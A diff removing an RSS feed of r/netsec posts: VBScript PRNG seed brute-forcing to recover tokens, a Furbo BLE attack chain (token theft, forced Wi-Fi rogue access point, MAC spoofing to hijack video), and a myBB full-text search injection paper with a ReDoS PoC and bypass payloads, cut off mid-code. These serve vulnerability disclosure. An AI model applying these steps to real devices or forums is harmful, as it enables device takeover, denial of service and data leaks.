@@ -1,921 +1,339 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Yet Another Random Story. VBScript&apos;s Randomize Internals.</title><link>https://blog.doyensec.com/2025/09/25/yet-another-random-story.html</link><author>/u/nibblesec</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:50:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In one of our recent posts, Dennis shared an interesting case study of C# exploitation that rode on -based password-reset tokens. He demonstrated how to use the single-packet attack, or a bit of old-school math, to beat the game. Recently, I performed a security test on a target which had a dependency written in VBScript. This blog post focuses on VBS’s  and shows that the situation there is even worse.The application was responsible for generating a secret token. The token was supposed to be unpredictable and expected to remain secret. Here’s a rough copy of the token generation code:The first thing I noticed was that the  function was called inside a loop. That should reseed the PRNG on every single iteration, right? That could result in repeated values. Well, contrary to many other programming languages, in VBScript, the  usage within a loop is not a problem per se. The function will not reset the initial state if the same seed is passed again (even if implicitly). This prevents generating identical sequences of characters within a single  call. If you actually want that behavior, call  with a negative argument immediately before calling  with a numeric argument.But if that isn’t an issue, then what is?How VBS’s  Works in PracticeHere’s a short API breakdown:If no seed is explicitly specified,  uses  to set it (not entirely true, but we will get there).  returns seconds since midnight as a  value. ￼ advances a global PRNG state and is fully deterministic for a given seed. Same seed, same sequence, like in other programming languages.There are some problematic parts here, though. Windows’ default system clock tick is about 15.625 ms, i.e., 64 ticks per second. In other words, we get a new implicit seed value only once every 15.625 milliseconds.Because the returned value is of type , we also get precision loss compared to a  type. In fact, multiple “seeds” round to the same internal value. Think of collisions happening internally. As a result, there are way fewer unique sequences possible than you might think!In practice there are at most 65,536 distinct effective seedings (details below). Because  resets at midnight, the same set recurs each day.We ran a local copy of the client’s code to generate unique tokens. During almost 10,000 runs, we managed to generate only 400 unique values. The remaining tokens were duplicates. As time passed, the duplicate ratio increased.Of course the real goal here would be to recover the original secret. We can achieve that if we know the time of day when the  function started. The more precise the value, the less computations required. However, even if we have only a rough idea, like “minutes after midnight”, we can start at 00:00 and slowly increase our seed value by 15.625 milliseconds.We started by double-checking our strategy. We modified the initial code to use a command-line provided seed value. Note, the same seed is used multiple times. While in the original code, it is possible that seed value changes between the loop iterations, in practice that doesn’t happen often. We could expand our PoC to handle such scenarios as well, but we wanted to keep the code as clean as possible for the readability.We took a precise  value from another piece of code and used it as an input seed. Strangely though, it wasn’t working. For some reason we were ending up with a completely different PRNG state. It took a while before we understood that  and  aren’t exactly the same things.VBScript was introduced by Microsoft in the mid-1990s as a lightweight, interpreted subset of Visual Basic. As of Windows 11 version 24H2, VBScript is a Feature on Demand (FOD). That means it is installed by default for now, but Microsoft plans to disable it in future versions and ultimately remove it. Still, the method of interest is implemented within the  library and we can take a look at :When we previously said that a bare  uses  as a seed, we weren’t exactly right. In reality, it’s just a call to WinApi’s . It computes seconds plus fractional milliseconds as s, then narrows to  () using the  assembly instruction.Let’s use  as an example. It can be represented as  in hex notation. After all this math is performed, our  becomes  and is used as the seed input.This is what happens otherwise, when the input is explicitly given:When we do specify the seed value, it’s processed in an entirely different way. Instead of being converted using the  opcode, it’s shifted right by 32 bits. So this time, our   becomes  instead. We end up with completely different seed input. This explains why we couldn’t properly reseed the PRNG.Finally, the middle two bytes of the internal PRNG state are updated with a byte-swapped XOR mix of those bits, while the top and bottom bytes of the state are preserved.Honestly, I was thinking about reimplementing all of that to Python to get a clearer view on what was going on. But then, Python reminded me that it can handle almost infinite numbers (at least integers). On the other hand, VBScript implementation is actually full of potential number overflows that Python just doesn’t generate. Therefore, I kept the token-generation code as it was and implemented only the seed-conversion in Python.Now, we can run the base code and capture a semi-precise current time value. Our Python works with properly formatted strings, so we can convert the number using a simple method:Let’s say the token was generated precisely at  and we got the QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 string. In the case of our target, we knew that some files were created at 17:55:54, which was rather close to the token-generation time. In other cases, the information leak could come from some resource creation metadata, entries in the log file, etc.We iterate time seeds in 0.015625-second steps (64 Hz) across the suspected window and we filter all duplicates.We started our  script with a 1s range and we successfully recovered the secret in the 4th iteration:PS C:\share> python3 .\brute_timer.py 17:55:54 17:55:55
-[INFO] Range 64554.00000 to 64555.00000 in 0.015625-s steps
-[64554.00000] Test #1: eYIkXKdsUTC3Uz#R)P$BlVRJie9U2(4B // calculated seed: 2.3397787718772567e+36
-[64554.01562] Test #2: ZTDgSGZnPP#yQv*M6L)#hQNEdZ5Px50$ // calculated seed: 2.3397838424796576e+36
-[64554.03125] Test #3: VP!bOBUjLK&uLq8I2G7*cMIAZV0Lt1v* // calculated seed: 2.3397889130820585e+36
-[64554.04688] Test #4: QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 // calculated seed: 2.3397939836844594e+36
-[...snip...]
-VBScript’s  and  are fine if you just want to roll some dice on screen, but don’t even think about using them for secrets.]]></content:encoded></item><item><title>Hacking Furbo - A Hardware Research Project – Part 5: Exploiting BLE</title><link>https://www.softwaresecured.com/post/hacking-furbo-a-hardware-research-project-part-5-exploiting-ble</link><author>/u/duduywn</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:31:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Part 5 of the Hacking Furbo blog series is here and in this article we'll be focusing on an area which has gotten little attention thus far: Bluetooth Low Energy (BLE).As with Part 2, we continued to find places where Furbo’s security was already quite good. Stubborn as we are, though, we were still able to find areas that were vulnerable. We will detail how we discovered the paths to exploiting various vulnerabilities in Furbo’s implementation of BLE through the analysis of a live device, its logs, and the decompiled mobile application.When a new device is first set up, the end-user has to connect that device to their local Wi-Fi network. Furbo handles this by connecting to the user's mobile phone, where a communication flow occurs over Bluetooth to pass the authentication details to the device. Once this is completed, the device ceases to communicate with the application over Bluetooth. Honestly, it was an area we overlooked at first because it was such a quick and seamless process.As we dug further into the application and device however, we realized it was an area we should explore further. This interest was prompted by discussions with a colleague who had done ample research on BLE in the past—Kevin2600.The first question we wanted to answer was simple: "Are the communications between device and mobile application encrypted?"To do so, we leaned on adb bugreport. On an Android device with developer options enabled, a report can be generated which details all of the logging information related to the operations of the device. By default, this bugreport does not include Bluetooth communications however by enabling Bluetooth HCI Snoop Log in the Developer settings we could gain insight into these too.So, we turned this on, ran the pairing process, and entered in the credentials of a hotspot we had set up for testing. To help us identify the password more easily we used a string we could more easily search for: “FINDMEPASSWORD”. We then pulled the report with adb bugreport <filename> onto our host machine and unzipped the archive.After digging up the btsnoop_hci.log file, we pulled it into WireShark where we could more easily analyze the communications. There were a ton of logs to parse, so we applied the btatt filter to reduce it some and found the first destination which was a MAC address and started from that point. This packet was our first indicator that we were focusing on the right device.Reviewing more of the packets, we realized that much of the communications were split up across several sends, meaning it would be challenging to decipher what exactly was being sent or received. It also seemed as though that some of the data may be hex encoded based on the packets seen in Wireshark. Rather than trying to piece it all together, we grepped out any possible hex values and whipped up a Python script which would parse the log file and hopefully extract whatever data we were looking for.And with that, we had our first BLE vulnerability. The passwords and SSIDs which were sent to a Furbo device were being communicated over BLE in an unencrypted format!After the excitement of this first finding we decided it would be well worth investigating this interface further. Using an nrf52840 adapter, we set up the Nordic Semiconductor nRF Connect app to view the exposed GATT Characteristics and Services through a graphical interface.While we could write to one characteristic, the rest were simply reads which returned information about our device. Fuzzing the writable characteristic with various characters we found that sending 1 or 2 would result in either a "soft" or "hard" reset of the device—essentially allowing us to turn the device off or disconnect it from the Wi-Fi temporarily.The "soft reset", from what we could tell, was used to change the Wi-Fi Network the device was connected to. This state was only temporary and once the device was manually rebooted, it would connect back to the original network using the saved credentials it had.We will return to the “hard reset” shortly.While it may seem like an annoyance at first glance, these devices are touted as security products in some of the marketing materials; meaning that this vulnerability has a slightly higher impact. If, for example, I were a bad guy breaking into someone's house, I could switch off the Furbo's video feed before entering with this vulnerability.As we were toying around with the pairing process, we monitored the device logs under /tmp/log, trying to determine what was occurringat each step; it was then that we discovered there must be more GATT Characteristics than what we saw at first glance with the nRF Connect application.In the second picture we can see the SSID and Wi-Fi password being sent in hex.We figured that if they were being used in the communication flow, they must be referenced somewhere in the APK. Using grep, we searched for the locations of the UUIDs.Within this file we found many more characteristics referenced, as well as operations they may be used for.Exposing BLE GATT CharacteristicsAfter some trial and error, we discovered that in order to expose the additional GATT characteristics and services  we would have to put the device into a factory reset mode. In this state all the GATT characteristics that were listed in the APK were visible and could be interacted with. The challenge for us with this requirement was that you would need physical access to insert a small paperclip and hold down a button for 10 seconds, at which point the attack seemed pointless.This brings us back to the previously mentioned reset modes we discovered through fuzzing: the second of which was the “Hard Reset”, this is where things got interesting. When we first ran the full reset command we didn't notice much of a difference compared to the "Soft Reset". The device went offline, but when we tried to scan for any other characteristics there were none to be found.After doing a little more research into BLE and how connections work we came to the conclusion that after issuing the "Full Reset" command, we would have to disconnect and reconnect our session. Once reconnected to the device after sending the "Full Reset" command we discovered that  of the device's GATT characteristics were active and available. These newly exposed characteristics opened the door for several attacks which we will explore throughout the rest of the article.Our theory was that we may have two different attack scenarios that could be exploited based on the information exposed by these GATT characteristics.The first attack was a Denial Of Service which revolved around the device registration process, specifically how devices could be re-registered after they were already bound to an account.The second attack could be used to interrupt and replace the camera feed of a device by exploiting how the device authenticated with the TUTK P2P network in order to stream video to the mobile application.Both of these attack chains required the following information from the victim device in order work: The second attack, in addition to the other three variables, also required the victim's P2P UUID which connected their device to the TUTK network.Reading Sensitive Data from Exposed GATT CharacteristicsThe characteristic C1C1D58F-6CDC-426D-AA4D-5A18BD88FE37 could be used to read the device token and 2E2F1C66-ACE9-46AA-A993-641FCE7A5C9C allowed us to read the P2P UUID the device was using in order to stream video over the TUTK network.Using these 2 exposed GATT characteristics, we were able to retrieve two out of the four victim details required to complete the attack chain. Now all that was left was to retrieve the AccountID and DeviceID.The AccountID and DeviceID would prove slightly more challenging to retrieve. We knew that the Firehose logging service, which we had decrypted in Part 1 of our blog series, contained these IDs, however up until this point we had only seen it run after a device was first connected to an account. We didn't like the restrictions this put on our attack chain, so we needed to uncover a way to control the Firehose.After much testing and log review, we discovered that there were other conditions that could trigger the service to run. If the device was disconnected from the Internet for more than three minutes the Firehose service would collect the data and attempt to send it off once re-connected.This was something we could control using some of the other newly exposed GATT characteristics.The following GATT characteristics were exposed after the device was put into "Full Reset" mode which we could use in order to control the device's internet connection:The scenario was fairly simple: if we were within range of the device we could disconnect it from its network, force it to connect to our own access point (while it was not connected to the internet), and then, after allowing for the three minute delay, reconnect it and proxy the traffic through certmitm. The end result was that the Firehose service would run and we'd decrypt the TLS traffic containing the AccountID and DeviceID.Gathering the Furbo Infinity StonesThe complete attack chain, using the Furbonator script:Get within range of the victim's Furbo device.Connect to the device over Bluetooth and put it into "Full Reset" mode.Retrieve the Device Token.Reset the WiFi Connection.Send the attacker-controlled SSID.Send the password for the attacker-controlled access point.Allow for a three minute delay.Send the Wi-Fi Ready command so the Victim Furbo Connects to your proxied network.Capture Firehouse logs using certmitm and grab the AccountID.Denial of Service — Re-Registering Victim DeviceWith these details we were now ready to attempt our first attack: re-registering the victim's device to our account.By combining the previous DeviceID Spoofing attack with the leaked AccountID, DeviceID, and Device Token an attacker can now re-register a victim's device, completely disabling it and preventing it from ever being registered again.Factory reset the attacker device.Connect to the device over UART and replace the MAC address with the victim's DeviceID. sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonModify /mnt/flash/furbo/setup_info.json, adding the victim's AccountID, DeviceID and DeviceToken.Add the device to the attacker's account following the instructions in the mobile application.During the registration process, when prompted with the message,"This Furbo was already registered. If you register a new account the previous account will be disconnected" click "Register New Account".Once the setup is completed the attacker should now have the victim's device added to their account.As their DeviceID is now associated with the attacker's account, and they cannot get the DeviceToken, the victim will be unable to re-register their device to their own account. As a result, they will have lost all functionality of their Furbo device, essentially bricking it.Look at me! I am the camera nowBuilding off of the DoS re-registration attack we could take this one step further. We could use the P2P UUID grabbed from BLE to interrupt the victim's video stream and replace it with the attacker's own stream. This is possible by abusing the P2P authentication flow in order to re-issue credentials for the spoofed UUID, authorizing the attacker device to stream on the TUTK network and replacing the victim's video stream with their own.In order to stream on the TUTK network each device requires P2P UUID. When a device is registered to your account you are also authorizing the mobile account to request the video stream from that particular P2P UUID.When the device is paired and registered, the mobile application retrieves a P2PAccountID, P2PAuthKey, and P2PPassword from an API—which are the values we retrieved from the device's memory in Part 2. These details are then passed to the device, from which it is sent back to the Furbo servers to retrieve a P2P UUID.This P2P UUID is bound to the DeviceID; even when a device is reset the DeviceID stays the same, meaning that when it reconnects it will maintain the same P2P UUID.However, having the P2P UUID is not enough to stream on the TUTK network. You also require an Authkey and Password. However, these credentials can automatically be generated and reissued to a device as long as it has a valid AccountID, DeviceID, DeviceToken, and P2P UUID which in our case we do.Credential Regeneration FlowThe device boots and checks for P2P credentials, if it fails to find the p2p_auth.json file the following flow occurs.The device makes POST requests to: /v5/device/setup, supplying the AccountID, DeviceToken, DeviceID, and P2P UUID.Furbo validates the request Confirms P2P UUID ↔ DeviceID ↔ AccountID relationshipIssues new TUTK credentials: authKey, password.Device writes a new p2p_auth.json file Old credentials are invalidated (only the latest credentials for a P2P UUID are valid on the TUTK network).Taking over the video streamRegister the device so it is active in the mobile application.Connect to device over UART and replace the MAC address with the victim's DeviceID sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonEdit the /mnt/flash/furbo/setup_info.json file and add the victim's AccountID, DeviceID, DeviceToken, and P2P UUID.Remove the /mnt/flash/furbo/p2p_auth.json file.Once the attacker's device reboots it will check to see if that p2p_auth.json file is located on the device, it will then reach out to Furbo's servers in order to retrieve the details. As all the details on the attacker's device are the same as the victim's device, Furbo will generate new credentials for the victims P2P UUID, invalidating their own. As a result, the attacker's device is the only valid “online” device for that P2P UUID. When the victim opens their mobile application, they will see the attacker's video stream and not their own as that is what will be returned when the application searches for that P2P UUID on the TUTK network.That concludes Part 5 of the Hacking Furbo blog series. BLE is an often overlooked communication protocol, one we nearly overlooked ourselves. However, as we have shown, it can yield very interesting results when it is interrogated effectively. We were able to build attack chains based on data garnered through BLE to take over the device’s video streams and gain unauthorized access to someone’s Wi-Fi network, serious stuff. The next part will be the grand finale! We will finish off with a review of the filesystem where we found numerous vulnerabilities including one which allowed us to view the activity of  Furbo worldwide.]]></content:encoded></item><item><title>Why “contained” doesn’t mean “safe” in modern SOCs</title><link>https://blog.strandintelligence.com/compliance-wont-stop-a-breach-heres-why/</link><author>/u/SuccessfulMountain64</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 09:12:34 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ReDisclosure: New technique for exploiting Full-Text Search in MySQL (myBB case study)</title><link>https://exploit.az/posts/wor/</link><author>/u/Difficult-Catch9885</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 21:12:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA["Even a small key can open a big lock" Azerbaijani Proverb
-
----[ Index
-1 - Introduction
-2 - Tradition
-    2.1 - ReDoS, not the OS
-    2.2 - REGEXP, RLIKE and others
-3 - How insecure, secure implementations are?
-4 - Study Case: myBB
-    4.1 - Identification
-    4.2 - Perfect Match Against Sanitization
-    4.3 - Exploiting
-5 - Acknowledgements
-6 - References
-
---[ 1 - Introduction
-For years, SQL Injection has been mostly about syntax-breaking payloads. But
-with tools getting advanced, it is more about creating "cooler payload" /
-finding ignored SAST warnings. I am a newbie who noticed this pattern going
-back and forth and started searching for possibility of injection, without
-escaping anything, something that SAST/WAFs don't have a rule for.
-
-This paper presents a new technique for Regex Injection. At the beginning I
-will explain just a bit of traditional methods that we knew before, then
-shift into the technique and then we will study one of the vulnerabilities I
-found in myBB which allowed viewing deleted thread names as an
-unauthenticated user.
-
---[ 2 - Tradition
-This section explains traditional methods that were usually used to identify
-vulnerabilities related to regex. But before going further, let's understand
-the difference between regex, wildcard, and operator. BTW, originally I
-wanted to call this paper WOR technique.
-
-----[ 2.1 - ReDoS, not the OS
-A regular expression (Regex) is a sequence of characters that specifies a
-match pattern in text. The main feature of regex is the ability to match
-complex string patterns. A wildcard, on the other hand, is a symbol used to
-represent zero or more characters. In SQL, the percent sign (%) and
-underscore (_); in regex, the period (.) and asterisk (*) are considered
-wildcards. Operators are logical symbols; some examples include AND, OR,
-NOT, =, !=, <, >, >=, <=, +, -, *, /. Operators like asterisk are used for
-calculations, so don't confuse them with wildcards. I guess now you
-understand why I wanted to call it WOR technique. Certainly not because WOR
-means thief in Russian and the whole article is about a technique for
-stealing information from software that I can't write about because its
-developers prioritize feature over security.
-
-Backtracking is a problem-solving method where you return to a previous
-decision point (backtrack) in a process and try a different option when the
-current path fails to produce a valid result. It is like being in a
-labyrinth with multiple paths. You try one path, but hit a dead end. So, you
-backtrack--go back to the last junction where you had other options--and try
-a different direction. You keep repeating this process until you either find
-the exit or exhaust all paths.
-
-A quantifier specifies how many times the preceding element must occur for a
-match to happen.
-
-Quantifier | Meaning                           | Regex | Match
-++++++++++++++++++++++++++++++++++++++++++++
-*                | Zero or more times          | p*       | "","p","ph"...
-+                | One or more                   | p+       | "p","ph","phr"
-?                | Zero or one                     | p?       | "", "p"
-{n}              | n times                           | p{3}     | "ppp"
-{n,}             | n or more times              | p{2,}    | "pp","ppp"...
-{n,m}          | Between n and m times | p{2,4}  | "pp", "ppp", "pppp"
-
-Nested quantifiers are patterns where a quantifier is applied to a subpattern
-that already has a quantifier. So I can't just take p+? pattern, add
-quantifier + and make it p+?+, because the syntax is invalid. This is where
-"Capturing group" comes to help. The p+ means "one or more p." When we add ?
-to it, it means "one or more p's (the + part), but not more than one (the ?
-part) p." It means that if the input is "ppp," the output will match exactly
-one p. So the output will be Match 1 (p), Match 2 (p), Match 3 (p). Now
-when I group this subpattern (p+?), the pattern match will stay the same,
-and the group match will be the same as the pattern match, because there is
-no extra quantifier. If I change it a bit by adding +, making it (p+?)+, it
-will mean "one or more p's, but not more than one p, repeated one or more
-times until it succeeds." So the subpattern will repeat until it succeeds;
-the inner regex takes the first p, second p, and third p. Now that no more
-characters are left, the pattern stops. Overall match is the concatenation
-of all results "ppp." A capturing group only "remembers" the last result of
-the subpattern, which is "p."
-
-Pattern  | Meaning of pattern   | Regex | Match Result  |
-++++++++++++++++++++++++++++++++++++++++++
-(...)        | groups a subpattern | (p+?)+ | "ppp" (pattern |
-match), "p" (group match)
-++++++++++++++++++++++++++++++++++++++++++
-ReDoS (Regular Expression Denial of Service) is a vulnerability where a regex
-lets an attacker supply input that makes the engine backtrack for an
-extremely long time, causing DoS. Usually, regex that has nested qualifiers
-leads to ReDoS.
-
-To create a ReDoS payload, our inner quantifier should grab as much as it
-can. Therefore, the subpattern could be something like a+ or a*. If our
-input is aaaac, it will match aaaa. Next, we can create a nested quantifier
-by using a* as the subpattern and then adding a + quantifier. This way, the
-a* group will match repeatedly until it succeeds. Our new regex is (a*)+.
-
-If the input is aaaac, the first match is aaaa. Then, because the asterisk
-(*) means "zero or more," we also get zero-length matches. For instance,
-after aaaa is matched, there is an empty match between aaaa and c, and
-another empty match after c, giving three matches in total (two of which are
-empty).
-
-We can force a mismatch after these matches by adjusting the pattern to
-expect the string to end with b, even though our input ends with c. Hence,
-the new regex is (a*)+b, and our input remains aaaac. The (a*)+ part can
-match aaaac in numerous ways because a* can match zero or more 'a's, and the
-+ quantifier allows multiple such matches. Each different way (a*)+ can
-consume part of the string is a "possible result" for that subpattern. Since
-the overall regex (a*)+b fails on its first attempt, the regex engine must
-backtrack and see if there was another way for (a*)+ to match aaaac that
-might allow the subsequent b to match. The bigger the input, the more
-backtracking possibilities are created, leading to a potential DoS.
-
-For example (just for demonstration), consider ways of partitioning aaaa into
-one or more non-empty groups of a. This is not exactly how most regex
-engines work, but it illustrates the concept of multiple ways to match.
-1: ("aaaa")
-2: ("aaa")("a")
-3: ("aa")("aa")
-4: ("a")("aaa")
-5: ("aa")("a")("a")
-6: ("a")("aa")("a")
-7: ("a")("a")("aa")
-8: ("a")("a")("a")("a")
-
-Pattern | Description                               | Input     |
------------|-----------------------------------------|------------|
-(a*)+b   | inner a+ (1 or more a), outer    | aaaac   |
-             | (...)+ repeats                            |              |
------------|-----------------------------------------|------------|
-Example script to demonstrate ReDoS:
-____________________________________________________________
-package main
-
-import (
-    "fmt"
-    "os"
-    "os/exec"
-    "os/signal"
-    "strings"
-    "syscall"
-    "time"
-    "github.com/dlclark/regexp2"
-)
-
-func main() {
-    fmt.Println("ReDoS PoC")
-    count := 200
-    pid := os.Getpid()
-    re := regexp2.MustCompile(`(a*)+b`, 0)
-    input := strings.Repeat("a", count) + "c"
-    sigs := make(chan os.Signal, 1)
-    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
-    done := make(chan struct{})
-    go func() { <-sigs; close(done); os.Exit(0) }()
-    go func() { re.MatchString(input); close(done) }()
-    for {
-        select {
-        case <-done:
-            return
-        default:
-            out, _ := exec.Command("ps", "-p", fmt.Sprintf("%d", pid),
-                "-o", "%cpu=").Output()
-            cpu := strings.TrimSpace(string(out))
-            fmt.Printf("CPU usage: %s\n", cpu)
-            time.Sleep(500 * time.Millisecond)
-        }
-    }
-}
-____________________________________________________________
-Response:
-khatai@5df0825ade8a tmp % go run main.go
-ReDoS PoC
-CPU usage: 0.0
-CPU usage: 80.2
-CPU usage: 97.7
-CPU usage: 100.0
-CPU usage: 100.0
-
-----[ 2.2 - REGEXP, RLIKE and others
-Beyond application-level regex engines, many database systems also use
-regular expressions for matching strings. Let's, for instance, take REGEXP.
-REGEXP itself can lead to information disclosure, and prepared statements
-won't help, as this has nothing to do with the regex itself. It all comes
-down to insecure implementation. For example, in a case where an SQL query
-is like this: SELECT Name FROM Data WHERE Content REGEXP '^?', using
-prepared statements or backslashing (preg_quote) won't be much help. If user
-input is .*, it all will look like this:
-Input: '.*'
-Trimmed: '.*'
-preg_quote()'d and escaped: '\.\*'
-Final REGEXP Pattern: '^\.\*'
-SELECT Name FROM Data WHERE Content REGEXP '^\.\*';
-
-Problems like these can be easily fixed if there is a "visibility" column
-or some special prevention against regex cases. In most applications, there
-probably are implementations to prevent these cases from happening. So we
-will want an SQL function, which accepts a "sequence of characters that
-specifies a match pattern in text" (which basically defines regex) but isn't
-documented as a regex function in the MySQL documentation.
-
---[ 3 - How insecure, secure implementations are?
-Let's take `real_escape_string` for example; everything seems fine, as it
-escapes single and double quotes, which are usually enough. But if you take
-a look at "backup" and similar options of most systems, you will notice
-that they don't use single/double quotes, they use backticks for table
-names. Backticks are used mostly with REPAIR, EXPORT, OPTIMIZE, ANALYZE,
-TRUNCATE, ALTER and so on. It might seem dumb, but I consider this as
-insecure design rather than insecure implementation. The C API function
-`mysql_real_escape_string_quote`, escapes backticks, while nothing else I
-have seen does. The above part was just an example, a "noteworthy comment"
-if you will.
-
-The real deal is Full-Text Search Functions. They are used in most
-softwares, especially blogs, LMS, and forums for advanced searching.
-According to Wikipedia, "Full-text search refers to techniques for searching
-a single computer-stored document or a collection in a full-text database".
-When performing Full-text search (from now on FTS) DBMS use certain
-characters with special meanings. These characters also specify match
-pattern, which defines regex, but not the usual regex we know of; this one
-is custom. MySQL can perform boolean full-text searches using special
-boolean mode operators; the syntax looks like this: MATCH (col1,col2,...)
-AGAINST (expr [search_modifier]). But before going into that, here is a
-basic table showing the difference between the Regex we know and Boolean
-Mode Operators.
-
-Character  | Traditional Regex | MySQL Boolean Mode        |
-________________________________________________
-| +        | one or more                   | word must be present       |
-| -         | No special meaning       | word must not be present |
-| *         | zero or more                  | Wildcard character           |
-| ^        | start of string or line       | No special meaning          |
-| $        | end of string or line        | No special meaning          |
-| .         | Wildcard character         | No special meaning          |
-| ()        | Grouping subpatterns   | Grouping subexpressions  |
-| []        | any character in the set | No special meaning           |
-| {n,m} | between n and m           | No special meaning           |
-| ""       | No special meaning        | exact sequence of words  |
-| <       | No special meaning        | increases weight of term    |
-| >       | No special meaning         | decreases weight of term  |
-| ~       | No special meaning         | same as decrease weight |
-_________________________________________________
-Example query from MySQL Doc, which shows queries containing MySQL and not
-containing YourSQL:
-mysql> SELECT * FROM articles WHERE MATCH (title,body)
-    -> AGAINST ('+MySQL -YourSQL' IN BOOLEAN MODE);
-_____________________________________
-| id | title                                    | body               |
-++++++++++++++++++++++++++++++++++++
-|  1 | MySQL Tutorials For         | DBMS stands |
-|  2 | How To Use MySQL Well | After you went |
-|  3 | Optimizing MySQL in the | In this tutorial   |
-|  4 | 1001 MySQL Tricks          | 1. Never run    |
-|  6 | MySQL Security               | When configu. |
-_____________________________________
-
-I think you see the problem now, there aren't any special implementations
-that would prevent these special operators (custom regex) from executing and
-the query itself is in quotes. So, we found something that:
-1. Doesn't require any escape
-2. Isn't identified by WAFs/SASTs/DASTs or anything else
-3. Has the possibility of leaking data
-
-Now the pros against REGEXP, RLIKE, LIKE and normal search:
-1. No one calls it regex, so input often won't be sanitized against
-   asterisks, etc.
-2. Has logic which might come in handy if needed
-
-The attack vector on which we should focus is Search functions, especially
-the ones which show "name" but don't show content, or show "count" of
-documents that contain a "content". Basically, anything that gives you an
-idea of the word "contains".
-
-Obviously, this kind of stuff isn't about theory, it is about practice. So
-I downloaded a list of open source web applications using a database and
-identified this pattern in some of them. The quickest and only fix at the
-moment was done by myBB team and identified as CVE-2025-48941. Before going
-further, here is a list of similar functions in other DBMSs.
-
-DBMS            | Full-text function / predicate
-_______________________________________________________________
-MySQL          | MATCH(col) AGAINST ('+python -java' IN BOOLEAN MODE)
-PostgreSQL  | to_tsvector(col) @@ to_tsquery('python & !java') or
-                      | @@ websearch_to_tsquery('python -java')
-SQL Server   | CONTAINS(col, ' "python" AND NOT "java" ')
-Oracle DB     | CONTAINS(col, 'python AND NOT java') > 0
-IBM Db2        | CONTAINS(col, '"python" & !"java"') =1
-_______________________________________________________________
-
---[ 4 - Study Case: myBB
-This section covers analysis of CVE-2025-48941. In my test env I enabled
-FTS. I put "Search Flood Time (seconds)" to 0, to ease my work, having
-multiple accounts or using proxies would provide the same effect (this value
-isn't crucial, it is only for the exploit to work faster), and I have 2
-deleted threads with titles "jackie chan" and
-"0ce3266d4eb71ad50f7a90aee6d21dcd"
-
-----[ 4.1 - Identification
-Deleted threads are visible to an admin when searching, and the search
-function is the same for an admin and a user, so the question is, what will
-be visible exactly?
-
-The `perform_search_mysql_ft` uses MATCH AGAINST functions when searching.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$message_lookin = "AND MATCH(message) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
-$subject_lookin = "AND MATCH(subject) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
---------------------------------------------------------------------------
-It is seen that there are 2 main options to MATCH AGAINST, message or
-subject. But before going into this, we have to understand how keywords are
-passed.
-
-Firstly, `perform_search_mysql_ft` takes the keyword and passes it into the
-`clean_keywords_ft` function
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-
-    $keywords = clean_keywords_ft($search['keywords']);
---------------------------------------------------------------------------
-
-----[ 4.2 - Perfect Match Against Sanitization
-So I am searching for "jack*". My "jack*" transformed into "jack"; to
-understand the reason, let's check the `clean_keywords_ft` function itself.
-In basic regex:
-------------------
-(\b.{1,2})(\s)|(\b.{1,2}$)
-------------------
-As you can see, it has \b (word boundary) which exists in these positions:
-* Between a "word character" and a "non-word character" (which is anything
-  not \w, like *, (, +, space, etc.).
-* Between a "non-word character" and a "word character".
-* At the beginning of the string if the first character is a \w.
-* At the end of the string if the last character is a \w.
-Because of the first reason, the asterisk gets replaced.
-
-To bypass it, I can simply add "ZZ" at the end. Because .{1,2}$ matches the
-last 1 or 2 characters. And now that the string is "jack*ZZ", the "*ZZ" part
-is between a "non-word character"(*) and a "word character" (ZZ). So the
-word character (ZZ) gets replaced and "jack*ZZ" becomes "jack*".
-
-After the `clean_keywords_ft` function, our keyword will be passed inside:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$word = str_replace(array("+", "-", "*"), '', $word);
---------------------------------------------------------------------------
-
-So our asterisk gets replaced again. Now to bypass it I will use 2 keywords;
-the first keyword will be "&&&&&". There is no special reason for that, I
-just need an extra keyword which will be ignored by MATCH AGAINST.
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-
-This one seems to be working. So I am passing &&&&& +jack*ZZ as input so
-that it would be converted into +&&&&& +jack*. The second asterisk won't get
-removed, and here is the reason:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-    $keywords = clean_keywords_ft($search['keywords']);
-    if($mybb->settings['minsearchword'] < 1)
-    {
-        $mybb->settings['minsearchword'] = 4;
-    }
-    $message_lookin = $subject_lookin = '';
-    if($keywords)
-    {
-        $keywords_exp = explode("\"", $keywords);
-        $inquote = false;
-        foreach($keywords_exp as $phrase)
-        {
-            if(!$inquote)
-            {
-                $split_words = preg_split("#\s{1,}#", $phrase, -1);
